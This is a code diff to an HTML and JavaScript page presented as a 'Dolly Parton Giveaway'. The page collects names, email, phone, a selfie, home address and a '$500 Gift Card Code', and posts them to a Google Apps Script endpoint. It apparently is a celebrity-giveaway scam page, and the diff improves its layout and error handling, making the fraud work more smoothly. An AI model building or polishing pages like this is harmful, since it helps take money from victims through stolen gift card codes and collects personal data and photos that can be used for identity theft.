@@ -1,15 +1,16 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dolly Parton Giveaway</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
         .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 20px; padding: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
-        h1 { color: #c62828; margin-bottom: 10px; }
+        h1 { color: #c62828; margin-bottom: 10px; text-align: center; }
         input, select, textarea { width: 100%; padding: 12px; margin: 8px 0 16px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 16px; }
-        button { background: #c62828; color: white; padding: 14px 28px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; }
+        button { background: #c62828; color: white; padding: 14px 28px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; }
         button:hover { background: #8b1e1e; }
         .step { display: none; }
         .step.active { display: block; }
@@ -17,6 +18,8 @@
         .success { background: #4caf50; color: white; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; }
         .error { background: #f44336; color: white; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; }
         .prize-badge { background: linear-gradient(135deg, #ffd700, #ffb347); padding: 10px; border-radius: 10px; text-align: center; margin: 20px 0; }
+        .nav-buttons { display: flex; gap: 10px; margin-top: 20px; }
+        .nav-buttons button { flex: 1; }
     </style>
 </head>
 <body>
@@ -32,7 +35,7 @@
         <input type="email" id="email" placeholder="Email Address *">
         <input type="tel" id="phone" placeholder="Phone Number *">
         <select id="fanDuration">
-            <option>How long have you been a fan?</option>
+            <option value="">How long have you been a fan?</option>
             <option>Less than 1 year</option>
             <option>1-5 years</option>
             <option>6-10 years</option>
@@ -54,8 +57,10 @@
         </div>
         <input type="file" id="selfie" accept="image/*" style="display:none">
         <div id="selfieName" style="margin: 10px 0; color: green;"></div>
-        <button onclick="prevStep(1)">← Back</button>
-        <button onclick="nextStep(3)">Next →</button>
+        <div class="nav-buttons">
+            <button onclick="prevStep(1)">← Back</button>
+            <button onclick="nextStep(3)">Next →</button>
+        </div>
     </div>
     
     <div id="step3" class="step">
@@ -65,16 +70,22 @@
         <input type="text" id="state" placeholder="State *">
         <input type="text" id="zip" placeholder="ZIP Code *">
         <input type="text" id="giftCode" placeholder="Gift Card Code ($500) *">
-        <button onclick="prevStep(2)">← Back</button>
-        <button onclick="nextStep(4)">Review →</button>
+        <div class="nav-buttons">
+            <button onclick="prevStep(2)">← Back</button>
+            <button onclick="nextStep(4)">Review →</button>
+        </div>
     </div>
     
     <div id="step4" class="step">
         <h3>Step 4: Submit Entry</h3>
         <p><strong>Tracking Number:</strong> <span id="tracking"></span></p>
-        <input type="checkbox" id="confirm"> I confirm all information is accurate
-        <button onclick="prevStep(3)">← Back</button>
-        <button onclick="submitForm()">🎉 SUBMIT ENTRY 🎉</button>
+        <label>
+            <input type="checkbox" id="confirm"> I confirm all information is accurate
+        </label>
+        <div class="nav-buttons">
+            <button onclick="prevStep(3)">← Back</button>
+            <button onclick="submitForm()">🎉 SUBMIT ENTRY 🎉</button>
+        </div>
     </div>
     
     <div id="message" style="margin-top: 20px;"></div>
@@ -86,8 +97,10 @@ let selfieFile = null;
 let trackingNumber = "";
 
 document.getElementById('selfie').addEventListener('change', function(e) {
-    selfieFile = e.target.files[0];
-    document.getElementById('selfieName').innerHTML = '✅ ' + selfieFile.name + ' uploaded!';
+    if(e.target.files.length > 0) {
+        selfieFile = e.target.files[0];
+        document.getElementById('selfieName').innerHTML = '✅ ' + selfieFile.name + ' uploaded!';
+    }
 });
 
 function nextStep(step) {
@@ -176,20 +189,27 @@ async function submitForm() {
             selfie: selfieBase64
         };
         
-        await fetch('https://script.google.com/macros/s/AKfycbwFKieQv4He0NJ4ljzDIu9nnB6ZH0GrShwdxZq9o_g9nlGrZ5SqtWNkVIjQhY6ZFTis/exec', {
+        const response = await fetch('https://script.google.com/macros/s/AKfycbwFKieQv4He0NJ4ljzDIu9nnB6ZH0GrShwdxZq9o_g9nlGrZ5SqtWNkVIjQhY6ZFTis/exec', {
             method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+                'Content-Type': 'application/json'
+            },
             body: JSON.stringify(payload)
         });
         
-        msgDiv.innerHTML = '<div class="success">✅ SUCCESS! Your entry has been submitted!<br>Tracking Number: ' + trackingNumber + '<br>Check your email for confirmation!</div>';
+        const result = await response.json();
         
-        setTimeout(() => {
-            location.reload();
-        }, 5000);
+        if(result.success) {
+            msgDiv.innerHTML = '<div class="success">✅ SUCCESS! Your entry has been submitted!<br>Tracking Number: ' + trackingNumber + '<br>Check your email for confirmation!</div>';
+            setTimeout(() => {
+                location.reload();
+            }, 5000);
+        } else {
+            throw new Error(result.error);
+        }
         
     } catch(error) {
+        console.error('Error:', error);
         msgDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
     }
 }
